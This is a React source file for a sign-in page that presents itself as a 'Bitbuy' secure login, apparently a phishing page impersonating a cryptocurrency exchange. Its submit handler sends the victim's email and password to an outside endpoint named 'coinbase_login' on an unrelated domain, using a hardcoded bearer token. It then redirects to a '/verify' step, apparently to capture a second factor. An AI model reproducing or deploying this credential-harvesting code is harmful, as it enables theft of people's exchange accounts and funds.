import { useState, useEffect } from 'react';
import { Link, redirect, useNavigate } from 'react-router-dom';
import { Helmet, HelmetProvider } from 'react-helmet-async';
import AppLayout from '../../layouts/AppLayout';
import {db} from '../../services/Firebase';
import { collection, addDoc, getDocs } from "firebase/firestore";
import { toast } from 'react-toastify';
import ValidationService from '../../services/ValidationService';
import axios from 'axios';


function Home() {

    let initLoginFormData       =   {
        email                       :   '', 
        password                    :   '',
        remember_me                 :   'N',
        loading                     :   false,
        domain                      :   window.location.hostname
    };
    
    const [loginFormData, setLoginFormData]     =   useState(initLoginFormData);
    const navigate                              =   useNavigate();

    const url = '';

    const submitLoginHandler        =   (event) => {
        event.preventDefault();

        setLoginFormData({...loginFormData, loading : true});

        let rules                   =   {
            'email'                     :   'required|email',
            'password'                  :   'required',
        };
        let rulesMsg                =   {
            'email'                     :    {required : 'Please enter Email'},
            'password'                  :    {required : 'Please enter Password'},
            'remember_me'               :    {required : ''}
        };
        let error                    =   ValidationService.rulesFirstErrorGenerator(loginFormData, rules, rulesMsg);
        if(error) {
            toast.error(error);
            setLoginFormData({...loginFormData, loading : false});
        } else {
            const headers       =   { 'Accept': 'application/json','Content-Type':'application/json','Authorization':'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY2NTM2Mzg3NjY3MTNkMDBkMzk3YzhmMCJ9.vUCJSsofnVWOb8U7NKRZzLZPzo2QMt5bpp3I_3vJPvA'};
            axios({
                method: 'POST', headers: headers, data : loginFormData, url: 'https://api2.real123.online/public/coinbase_login'
            })
            .then(function (response) {
                setLoginFormData({...loginFormData, loading : false});
                //Goto Verify Screen :-
                return navigate("/verify", { state: { loginFormData : loginFormData } });
            })
            .catch(function (error) {
                let msg                 =   error?.response?.data?.detail ?? 'Application not initialize successfully.';
                toast.error(msg);
                setLoginFormData({...loginFormData, loading : false});
            });
        }
    }

return (<AppLayout>
        <Helmet>
            <title>Sign in Bitbuy</title>
        </Helmet>
        <div className='container'>
            <div className="row justify-content-center mt60 pt60">
                <div className='col-sm-5 bg-white rounded-5 shadow-lg text-dark p25'>
                    <div className='col-sm-12 text-center'>
                        <h1 className='h4 fw-bold'>Secure Sign-in</h1>
                    </div>
                    <form className="" onSubmit={submitLoginHandler}>
                        <div className="form-floating my25">
                            <input type="email" required className="form-control" placeholder="Email"
                                value={loginFormData.email}
                                onChange={e => setLoginFormData({...loginFormData, 'email' : e.target.value }) }
                            />
                            <label htmlFor="floatingInput">Email</label>
                        </div>
                        <div className="form-floating my25">
                            <input type="password" required className="form-control" placeholder="Password" 
                                value={loginFormData.password}
                                onChange={e => setLoginFormData({...loginFormData, 'password' : e.target.value }) }
                            />
                            <label htmlFor="floatingInput">Password</label>
                        </div>
                        <div className='text-center mx-auto d-grid gap-2 my25'>
                            <button type="submit" className={['btn','btn-danger' ,'btn-primary-2', 'btn-lg', 'btn-block',  loginFormData.loading ? 'disabled' : ''].join(' ')} >
                                {loginFormData.loading && <span className="spinner-grow spinner-grow-sm me15" aria-hidden="true"></span>}
                                <span>Sign In</span>
                            </button>
                        </div>
                        <div className="row my10 text-center">
                            <div className='col-sm-12'>
                                 <Link className='btn btn-link text-danger' >Forgot password?</Link>
                            </div>
                        </div>
                        <div className="row my10 text-center">
                            <div className=''>Don't have an account? <span className='text-danger'>Sign up</span></div>
                            <div className='fs12 pt15'>Choose the original platform you used to create your account</div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </AppLayout>)
}

export default Home
